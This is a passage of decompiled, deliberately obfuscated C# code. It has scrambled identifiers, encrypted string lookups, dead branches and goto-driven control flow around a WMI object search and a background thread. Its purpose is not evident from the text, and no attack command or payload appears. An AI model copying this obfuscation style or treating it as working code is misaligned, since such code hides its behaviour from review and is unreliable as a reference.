                    managementObject = (ManagementObject) \u001E\u0002.\u007E\u0006\u0004((object) objectEnumerator);
                    goto label_9;
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
            finally
            {
              if (objectEnumerator != null)
                \u0013.\u007E\u009D((object) objectEnumerator);
            }
          }
        }
        finally
        {
          if (managementObjectSearcher != null)
            \u0013.\u007E\u009D((object) managementObjectSearcher);
        }
      }
      while (false);
      return str;
    }

    public static void \u0002([In] string obj0, [In] string obj1)
    {
      int num1 = \u0011\u0002.\u0093\u0003(obj0) ? 1 : 0;
      int num2;
      while (true)
      {
        if (num1 != 0)
          goto label_5;
label_2:
        if (!\u0011\u0002.\u0093\u0003(obj1))
          goto label_24;
label_5:
        if (true)
        {
          \u000F.\u0001.\u0007 = \u000F.\u0001.\u0002;
          num2 = 5;
          if (num2 == 0)
            num1 = num2;
          else
            goto label_25;
        }
        else
          goto label_2;
      }
label_7:
      try
      {
        int num3 = \u0002.\u0002 ? 1 : 0;
        if (true)
        {
          if (num3 == 0)
            num3 = global::\u0007.\u0087(\u0002.\u0001, string.Empty) ? 1 : 0;
          else
            goto label_18;
        }
        int num4;
        if (num3 != 0)
        {
          \u0002.\u0001(\u0011.\u008E(\u0002.\u001C(2809), \u0002.\u0001(\u0010.\u008D(\u0002.\u001C(579), \u0002.\u0001)), \u0002.\u001C(2862)), \u0002.\u0005);
          try
          {
            \u0002.\u0002();
          }
          catch
          {
          }
          Thread thread = new Thread(new ThreadStart(\u000E.\u0004.\u0001));
          \u0084.\u007E\u0094\u0002((object) thread, true);
          \u0013.\u007E\u0002\u0002((object) thread);
          int num5 = 1;
          if (num5 != 0)
          {
            \u0002.\u0002 = num5 != 0;
            num5 = 1;
          }
          if (num5 != 0)
          {
            \u0002.\u0003 = num5 != 0;
            return;
          }
          num4 = num5;
          goto label_19;
        }
label_18:
        num4 = \u000E.\u0004.\u0001 ? 1 : 0;
label_19:
        int num6;
        for (; num4 != 0; num4 = num6)
        {
          num6 = \u0002.\u0003 ? 1 : 0;
          if (false)
            continue;
          if (num6 == 0)
            break;
          \u0002.\u0001(\u000E.\u0004.\u0001(), \u0002.\u0005);
          \u000E.\u0004.\u0002 = true;
          \u0002.\u0002 = true;
          break;
        }
        return;
      }
      catch
      {
        return;
      }
label_24:
      \u000F.\u0001.\u0007 = obj0;
      \u000F.\u0001.\u0008 = obj1;
      goto label_7;
label_25:
      \u000F.\u0001.\u0008 = \u0002.\u0001(num2);
      goto label_7;
    }

    static \u0002()
    {
      if (false)
        return;
      \u0005.\u0001(typeof (\u0002));
      if (true)
        goto label_7;
label_6:
      \u0002.\u0001 = string.Empty;
      return;
label_7:
      \u0002.\u0001 = new Random();
      do
      {
        \u0002.\u0001 = true;
        if (true)
          \u0002.\u0002 = false;
        else
          goto label_6;
      }
      while (false);
      \u0002.\u0003 = false;
      goto label_6;
    }
  }
}
